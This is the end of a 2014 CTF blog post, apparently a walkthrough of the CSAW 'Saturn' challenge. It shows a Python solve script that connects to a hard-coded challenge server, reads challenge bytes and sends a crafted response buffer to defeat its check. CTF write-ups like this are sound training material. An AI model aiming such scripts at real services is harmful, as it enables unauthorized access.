+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&quot;54.85.89.65&quot;</span>
+</span><span class='line'><span class="c">#target = &quot;127.0.0.1&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># banner </span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\xa8\xa9\xaa\xab\xac\xad\xae\xaf</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">c0</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 0 </span>
+</span><span class='line'><span class="n">c1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 1 </span>
+</span><span class='line'><span class="n">c2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 2 </span>
+</span><span class='line'><span class="n">c3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 3 </span>
+</span><span class='line'><span class="n">c4</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 4 </span>
+</span><span class='line'><span class="n">c5</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 5 </span>
+</span><span class='line'><span class="n">c6</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 6 </span>
+</span><span class='line'><span class="n">c7</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>        <span class="c"># challenge 7 </span>
+</span><span class='line'>
+</span><span class='line'><span class="n">challenge</span> <span class="o">=</span> <span class="n">c0</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">+</span> <span class="n">c4</span> <span class="o">+</span> <span class="n">c5</span> <span class="o">+</span> <span class="n">c6</span> <span class="o">+</span> <span class="n">c7</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe0</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c0</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe1</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe2</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe3</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c3</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe4</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c4</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe5</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c5</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe6</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c6</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\xe7</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">c7</span> <span class="o">+</span>
+</span><span class='line'><span class="s">&quot;</span><span class="se">\x80</span><span class="s">&quot;</span>
+</span><span class='line'><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Swappage</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-09-24T21:20:47+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:20 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough/" data-via="" data-counturl="http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/09/23/hello-world/" title="Previous Post: Hello World">&laquo; Hello World</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/09/28/csaw-2014-fluffy-no-more/" title="Next Post: CSAW 2014: Fluffy no more">CSAW 2014: Fluffy no more &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/09/28/csaw-2014-fluffy-no-more/">CSAW 2014: Fluffy No More</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/24/csaw-2014-saturn-walkthrough/">CSAW 2014: Saturn Walkthrough</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/23/hello-world/">Hello World</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Swappage -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
